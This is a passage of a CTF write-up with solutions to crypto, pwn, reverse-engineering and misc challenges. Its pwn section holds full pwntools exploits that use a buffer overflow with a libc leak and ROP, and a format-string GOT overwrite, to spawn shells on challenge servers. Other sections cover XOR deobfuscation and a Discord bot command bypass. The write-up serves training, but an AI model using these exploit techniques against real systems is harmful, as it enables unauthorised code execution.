xored = ['\x00', '\x00', '\x00', '\x18', 'C', '_', '\x05', 'E', 'V', 'T', 'F', 'U', 'R', 'B', '_', 'U', 'G', '_', 'V', '\x17', 'V', 'S', '@', '\x03', '[', 'C', '\x02', '\x07', 'C', 'Q', 'S', 'M', '\x02', 'P', 'M', '_', 'S', '\x12', 'V', '\x07', 'B', 'V', 'Q', '\x15', 'S', 'T', '\x11', '_', '\x05', 'A', 'P', '\x02', '\x17', 'R', 'Q', 'L', '\x04', 'P', 'E', 'W', 'P', 'L', '\x04', '\x07', '\x15', 'T', 'V', 'L', '\x1b']
s1 = ''.join(xored)
s2 = "ctf" * len(xored) # We need the key to be equal length or longer than the cipher text

a_list = [chr(ord(a) ^ ord(b)) for a, b in zip(s1, s2)]
print("".join(a_list))
```

Running it yields `ctf{79f107231696395c004e87dd7709d3990f0d602a57e9f56ac428b31138bda258}`

## Pwn
### bazooka
```python
#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host 35.234.65.24 --port 30812 ./pwn_bazooka_bazooka
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('./pwn_bazooka_bazooka')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or '35.234.65.24'
port = int(args.PORT or 30812)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
set follow-fork-mode parent
set follow-exec-mode same
b *0x0000000000400757
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)

io = start()

io.sendlineafter("Secret message: ", "#!@{try_hard3r}")

pop_rdi = 0x00000000004008f3
main = exe.symbols["main"]

payload = b"A"*(0x80-8)
payload += p64(pop_rdi)
payload += p64(exe.got["puts"])
payload += p64(exe.plt["puts"])
payload += p64(main)
io.sendlineafter("Message: ", payload)

io.recvuntil("Hacker alert")
io.recvline()
leak = u64(io.recvline().rstrip().ljust(8, b"\x00"))
log.info(f"leak: {hex(leak)}")

if args.LOCAL:
    libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
else:
    libc = ELF("libc6_2.27-3ubuntu1.3_amd64.so")

libc.address = leak - libc.symbols["puts"]
log.success(f"libc base: {hex(libc.address)}")
payload = b"A"*(0x80-8)
payload += p64(pop_rdi)
payload += p64(next(libc.search(b"/bin/sh")))
payload += p64(pop_rdi+1) # ret gadget for stack alignment
payload += p64(libc.symbols["system"])
payload += p64(libc.symbols["exit"])

io.sendlineafter("Secret message: ", "#!@{try_hard3r}")
io.sendlineafter("Message: ", payload)

io.interactive()

# ctf{9bb6df8e98240b46601db436ad276eaa635a846c9a5afa5b2075907adf39244b}
```

Vulnerable function protected with password.
The vuln is a buffer overflow. First we trigger the bug to leak the address of puts through the GOT.
This enables us to find the base address of libc. We then trigger the bug a second time and ROP into `system("/bin/sh")`.

### darkmagic
```python
#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host 34.89.250.23 --port 32440 ./darkmagic
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('./darkmagic')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or '34.89.250.23'
port = int(args.PORT or 32440)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
b *0x00000000004007FF
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)

io = start()

io.recvline()

writes = { exe.got["printf"]: exe.plt["system"] }
payload = fmtstr_payload(8, writes=writes, write_size="byte")
io.sendline(payload)
io.sendline("/bin/sh;")

io.interactive()
# dctf{857ee5051eeccf7cbdfa0ab9986d32f89158429fc12348e15419a969ddcb6bfb}
```

Format string vuln. Read + printf called in a loop. We use the first `printf()` call to overwrite `printf@GOT` with `system` (we have `system` in the PLT). The second `printf()` will then execute whatever we send after the format string payload.

## Reverse engineering
### secret-reverse
This binary opens up a file `message.txt` and prints out the encoded version of it. 
Our target is to find some message contents, such that the encoded content becomes `46004746409548141804243297904243125193404843946697460795444349`. 

I quickly noticed that the output was of variable length, with only 1-2 letters output per input letter. With this, I brute-forced 2 and 2 letters at the time, picking the encoded message that was the closest match with the target.

The original message was: `yes_i_am_a_criminal_mastermind_beaware`. Thus the flag becomes: `ctf{9b9972e4d59d0360b5f1b80a5bbd76c05d75df5b636576710a6271c668a10ac5}`

Solution script:
```python
from subprocess import check_output, CalledProcessError
from string import printable, ascii_lowercase
from itertools import product
from hashlib import sha256

ALPHA = ascii_lowercase +"_"
TARGET = "46004746409548141804243297904243125193404843946697460795444349"

def run(s):
    with open("message.txt","w") as fd: fd.write(s)
    try:
        out = check_output(["./rev_secret_secret.o"])
        return out.strip().split(b"Encoded:  ")[1].decode()
    except CalledProcessError:
        print(f"Input {s} crashed")
        return ""

def score(s1, s2):
    for i in range(min([len(s1),len(s2)])):
        if s1[i] != s2[i]:
            return i
    return min([len(s1),len(s2)])

known = "yes_i_am_a_criminal_mastermind_beawa"
best = 0
beststrings = []
for comb in product(ALPHA, repeat=2):
    T = known + ''.join(comb)
    out = run(T)
    if out == TARGET:
        print(f"ctf{{{sha256(T.encode()).hexdigest()}}}")
        break
    if (m := score(out, TARGET)) >= best:
        print(T, m, out)
        if m > best:
            beststrings = [T]
            best = m
        else:
            beststrings.append(T)
        
print(best)
print(beststrings)
```
    
### kalf-game
Change level to 10000 (at 0xE5A04) and the flag is put together and printed:
`ctf{ddba6614a32456631c125eb1a4327c52686c71d909a92ec05ea5eb510eae81d9}`


### yopass-go
```sh
$ strings yopass-go/yopass | grep ctf
*runtime.structfield
found bad pointer in Go heap (incorrect use of unsafe or cgo?)runtime: internal error: misuse of lockOSThread/unlockOSThreadruntime.SetFinalizer: pointer not at beginning of allocated blockstrconv: internal error: extFloat.FixedDecimal called with n == 0runtime:greyobject: checkmarks finds unexpected unmarked object obj=ctf{0962393ce380c3cf696c6c59a085cde0f7edd1382f2e9090220abdf9a6396c88}runtime: found space for saved base pointer, but no framepointer experiment
/home/lucian/Desktop/ctf/yopass-go/yopass.go
/home/lucian/Desktop/ctf/yopass-go/yopass.go
[]runtime.structfield
runtime.structfield
runtime.structfield
*runtime.structfield
"[]runtime.structfield
$runtime.structfield
%runtime.structfield
 *runtime.structfield
```

and there we go: `ctf{0962393ce380c3cf696c6c59a085cde0f7edd1382f2e9090220abdf9a6396c88}`


### stripped-go
used [golang_loader_assist.py](https://github.com/strazzere/golang_loader_assist) to recover symbols.
main_main performs AES encryption with this passphrase: `thisis32bitlongpassphraseimusing`.
and the message is: `g01sn0tf0rsk1d1e`. which means that the flag is ctf{sha256{g01sn0tf0rsk1d1e}} == ctf{a4e394ae892144a54c008a3b480a1b22a6b64dd26c4b0c9eba498330f511b51e}


### modern-login
We quickly noticed the mp3 file that contained some Python files. We extracted the files by doing the following steps:
1. Unzipping the APK and traversing to the `assets/` folder. 
2. Running `file` showed us that `private.mp3` was a zipped folder. 
3. Unzipping it revealed another `private.mp3` file which was a tar
4. Extracting this as well provided us with several files, among them was `main.py`.

At first, they just seemed like bundled files and we didn't check them out much. However, we looked at the files in the mobile file system after running the app. There, we found the same files. At this point we looked further into them. 

The most interesting file was `main.py`. It contained some functions to check the password and to XOR encrypt strings. 

Part of `main.py`:
```
S=len
o=bytes
v=enumerate
W=print
h=None

def n(byt):
 q=b'viafrancetes'
 f=S(q)
 return o(c^q[i%f]for i,c in v(byt))
 
def d(s):
 y=n(s.encode())
 return y.decode("utf-8")
```

Running the `d()` function decrypted the XOR encrypted strings in the file. This revealed that 
`\x15\x1d\x07\x1dATX\x00P\x11RJG\r\x04VJW_S\x07L\x00J\x15\x0bQV\x13WZ\x07TB\x06A\x15\x0f\x02T\x10\x04^S\x07EV@\x10\r\x07\x07GPW[QFUAG]XVK\x02\rR\x18`
was the flag:

`ctf{356c5e791de08610b8e9cb00a64d16c2cfc2be00b133fdfa5198420214909cc1}`


### dumb-discord
We get a file to reverse: `server.cpython-36.pyc`

This is a Python bytecode file that is easy to decompile using *Uncompyle6*

```shell
uncompyle6 server.cpython-36.pyc > server.py
```

When looking at the code we can see that this is a Discord bot

```python
from discord.ext import commands
import discord, json
from discord.utils import get

def obfuscate(byt):
    mask = b'ctf{tryharderdontstring}'
    lmask = len(mask)
    return bytes(c ^ mask[(i % lmask)] for i, c in enumerate(byt))


def test(s):
    data = obfuscate(s.encode())
    return data


intents = discord.Intents.default()
intents.members = True
cfg = open('config.json', 'r')
tmpconfig = cfg.read()
cfg.close()
config = json.loads(tmpconfig)
token = config[test('\x17\x1b\r\x1e\x1a').decode()] # token
client = commands.Bot(command_prefix='/')

@client.event
async def on_ready():
    print('Connected to bot: {}'.format(client.user.name))
    print('Bot ID: {}'.format(client.user.id))


@client.command()
async def getflag(ctx):
    await ctx.send(test('\x13\x1b\x08\x1c').decode()) # pong


@client.event
async def on_message(message):
    await client.process_commands(message)
    if test('B\x04\x0f\x15\x13').decode() in message.content.lower(): # !ping
        await message.channel.send(test('\x13\x1b\x08\x1c').decode()) # pong
    if test('L\x13\x03\x0f\x12\x1e\x18\x0f').decode() in message.content.lower(): # /getflag
        if message.author.id == 783473293554352141:
            role = discord.utils.get((message.author.guild.roles), name=(test('\x07\x17\x12\x1dFBKXO\x11\x1d\x07\x17\x16\n\n\x01]\x06\x1d').decode())) # dctf2020.cyberedu.ro
            member = discord.utils.get((message.author.guild.members), id=(message.author.id))
            if role in member.roles:
                await message.channel.send(test(config[test('\x05\x18\x07\x1c').decode()])) # flag
    if test('L\x1c\x03\x17\x04').decode() in message.content.lower(): # /help
        await message.channel.send(test('7\x06\x1f[\x1c\x13\x0b\x0c\x04\x00E').decode()) # try harder!
    if '/s基ay' in message.content.lower():
        await message.channel.send(message.content.replace('/s基ay', '').replace(test('L\x13\x03\x0f\x12\x1e\x18\x0f').decode(), '')) # /getflag
```

The script has an encode function that uses xor to obfuscate strings. We can see that the key is `ctf{tryharderdontstring}`

After xoring all of the strings in the script with this key, we now know which commands that are available:
- !ping
- /getflag
- /help
- /s基ay

We can also see that in order to get the flag stored in the config file, we need an author with ID **783473293554352141** to execute the `/getflag` command.
This author also needs the `dctf2020.cyberedu.ro` role.

My guess is that this is the ID of the bot.

But where do we find the bot? It turns out that you can invite any bot to your own Discord server if you have the ID. Here is the link:
https://discord.com/oauth2/authorize?client_id=783473293554352141&scope=bot&permissions=0

This user is called `DCTFTargetWhyNot`. Lets invite it to our own server

![](https://i.imgur.com/yEF7iDl.png)

Now we just need to force the bot to execute the `/getflag` command, and the `/s基ay` command will help us with that. We can make the bot say anything if we pass an argument to this command.

However, there are two replace methods that removes `/s基ay` and `/getflag` from our message.

We can bypass this by making the `/getflag` command all uppercase, since the bot is converting all commands to lowercase.

![](https://i.imgur.com/hwRXfvJ.png)

Oh no! Looks like the flag is also xor-encrypted, so we need to xor it with the same known key as we found earlier:

`ctf{1b8fa7f33da67dfeb1d5f79850dcf13630b5563e98566bf7b76281d409d728c6}`

## Misc
### qr-mania
First we extracted all the pictures from the pcap using wireshark
every picture is a QR code, so we wrote a script to dump the data from every code. qrtools was not able to deal with most of the qr codes as they were different colors, so we converted all of them into black/white pictures before decoding.

the output didn't look like a flag, but we noticed that all the different parts of the flag was there (e.g. C, T, F, and {, }).
After checking different things like the order the pictures were downloaded in, the date in every picture, etc. we found out that there was a comment in the EXIF data of every picture telling us the position of that picture. we used this to make an ordered list of the files:

```
huquiiddfswdqalnctdi.png
rrhggrokkhbwadumtkhx.png
dglakvmqmabxcqlpgbjb.png
fbnribfqosqcgsbvslvz.png
ytwlritcxznphymnsowe.png
ejznsfmiucllxxespijz.png
hchwxnsotuqrtbrdmbmg.png
yzhfednrfjsvinsbbyhp.png
eiyhbbcrfnwncfsghmez.png
suvwivhtpjkcdpcdurty.png
biuwfrwgdocdypyliqyt.png
rmdueayyyacxcceysxtm.png
gtxiufelpdevwvcpejql.png
kxcgjifkviewjaiwydos.png
pvsyteygdilvpctcavzm.png
srfedsijdcfewypfoeii.png
xfcbvnbakbgypttpslvk.png
dmdkaosivnyzxyzmglai.png
kbavpqschcbaxbezypla.png
loaaiwgsfohhebksrzve.png
rvvkzxxdoyzdechbpaiw.png
xsdkmqnnwrscbvbbprsw.png
vcdqnjgliurrsbczwljv.png
dfhwcysjjnrnhfziizlr.png
dwpgvvlipmmhlkulbrtt.png
hsqqemzyyeqczawnerdp.png
ilymnjclovkuejytnwvi.png
jckteobzkpvxoqqrqovd.png
lilikwxihvrdnqsvepqz.png
zslcptglhdyldbzmlren.png
bynatxrryamhwwhmmroj.png
kamdmutdlzdoypbozuhz.png
oedfvuiyglrsmoociury.png
ofqmletvbqbxzygbzdrh.png
rkdyzefqczfgxaqkqxpt.png
xcrtvutynuuswwpcqojs.png
yepskbbojoroewcotddo.png
cllzodvnyvvmbppaktsd.png
dhqclnghhlrjxjmhjzon.png
kzlibdjxvtbgtiaowvez.png
qpuohuugyhrhfaxdyqux.png
xgslqgwnecldbojahatx.png
kgzjqaffmkezutjdcqyw.png
kmziktrekxzaihwkocfj.png
lrhsihqzqeuisjlgoyky.png
nhbiyacdrbxgrutijbxi.png
eioshuilsoxydsahsfnl.png
rvvcnqbnbdslgdrwatrk.png
dtruebslzybqbiewkwjr.png
dwesxvndmatigdqdvcpr.png
nkmswrsvwrnmapsnillk.png
oyhwsqkdqheovawwlggm.png
pgkrzpxhehywhtmkjgsb.png
avudtreighimhcgmwape.png
kuimxqwkydzdfhvwzayz.png
yybbwqnirqzldfiheiyh.png
zstxtahbtgccautnswcf.png
szpzkekngxnasbbjwhhx.png
xhaffangdrxmuvdpurdh.png
uwjmnpykkkaoxdeesmxi.png
ajxxcwfgozxpbhnauore.png
gzmshnrwkknmmitqnqzp.png
hfnkcgtjyeprtbaldxxk.png
lkvdwmunrarpuyqzdyne.png
jkfxjauvqodhqwzblgen.png
vuiwwzjdojhdlaaamzwb.png
lmmfdbfmheysbhbgjazn.png
wbuhqpnwfuovgdwoedoc.png
czguxctbmqgfgxhvnwzr.png
```

with that list we could run our script again to get the flag:
```python
#!/usr/bin/env python3
import qrtools
import os
from PIL import Image


def get_colors(pic):
    im = Image.open(pic, "r")
    pix = im.load()
    return set([pix[x,y] for y in range(im.size[1]) for x in range(im.size[0])])


def convert_colors(pic):
    im = Image.open(pic)
    white = ( 255, 255, 255 )
    black = ( 0, 0, 0 )

    pix = im.load()
    white_target = pix[0, 0]
    print(f"target: {white_target}")

    out = f"{pic[:-4]}_fixed.png"
    im2 = Image.new("RGB", im.size, (255, 255, 255))
    pix2 = im2.load()
    for y in range(im.size[1]):
        for x in range(im.size[0]):
            if pix[x,y] == white_target:
                pix2[x,y] = white
            else:
                pix2[x,y] = black
    im2.save(out, "PNG")
    return out

import re

def main(file_list):
    with open(file_list, "r") as f:
        files = f.readlines()

    cnt = 0
    res = {}
    for filename in files:
        filename = filename.rstrip()
        if ".png" not in filename:
            continue
        print(filename)

        fixed = convert_colors(filename)

        qr = qrtools.QR()
        qr.decode(fixed)
        print(f"{filename}: {qr.data}")
        if qr.data is None:
            print("failed!")
            break

        from subprocess import check_output
        out = check_output(f"exiftool {filename}", shell=True).decode("utf-8")
        m = re.search(r"Comment.*: ([0-9]+)/69", out)
        num = int(m[1])
        res[num] = qr.data

    from pprint import pprint
    pprint(res)

    flag = "".join([res[i] for i in range(1, 69+1)])
    print(flag)



if __name__ == "__main__":
    main("files.txt")
```

`CTF{2b2e8580cdf35896d75bfc4b1bafff6ee90f6c525da3b9a26dd7726bf2171396}`


